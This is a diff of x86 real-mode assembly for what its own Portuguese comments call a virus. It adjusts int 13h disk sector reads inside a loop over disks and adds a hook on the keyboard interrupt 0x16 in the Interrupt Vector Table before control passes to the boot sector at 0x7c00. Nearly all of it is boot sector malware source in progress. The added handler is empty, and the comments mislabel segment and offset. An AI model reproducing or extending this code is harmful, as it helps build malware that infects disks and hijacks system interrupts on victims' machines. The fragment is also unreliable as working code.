@@ -43,7 +43,7 @@ loop_over_disks:
         mov al, 0x02
         xor ch, ch
         mov cl, 0x01
-        mov bx, 0x7e00
+        mov bx, 0x7c00
         int 13h
         
         
@@ -53,7 +53,7 @@ loop_over_disks:
         xor ch, ch
         mov cl, 0x01
 
-        mov bx, 0x7c00
+        mov bx, 0x7e00
         int 13h
 
         jmp next
@@ -92,15 +92,28 @@ transfer_bytes:
     mov bx, 0x7c00
     int 13h
 
-    
-    popa
-    sti
+    ; Inclusão de Interrupt Handler (Interrupt Vector Table = IVT)
+    ; nesse exemplo eu vou utilizar a interrupção 0x16 (Keyboard I/O)
+    mov ax, word [es:0x16*4]   ; segmento
+    mov bx, word [es:0x16*4+2] ; offset
+
+    mov ax, interrupt       ; Hookando o endereço de Interrupt no ax
+    sub ax, transfer_bytes  
+
+    ;Salvamos a nossa interrupção na IVT 
+    mov word [es:0x16*4], ax        ; Segment
+    mov word [es:0x16*4+2], cs      ; Offset
+
+    popa    ; Retorna os registradores salvos no começo do virus
+    sti     ; Libera as interrupções (oposto de cli)
     jmp 0x0:0x7c00
+
+; Codigo Hookado ao IVT
+interrupt:
+    
 
 ; FIM do transfer_bytes
 transfer_end:
-
-
 
 DriverID db 0
 
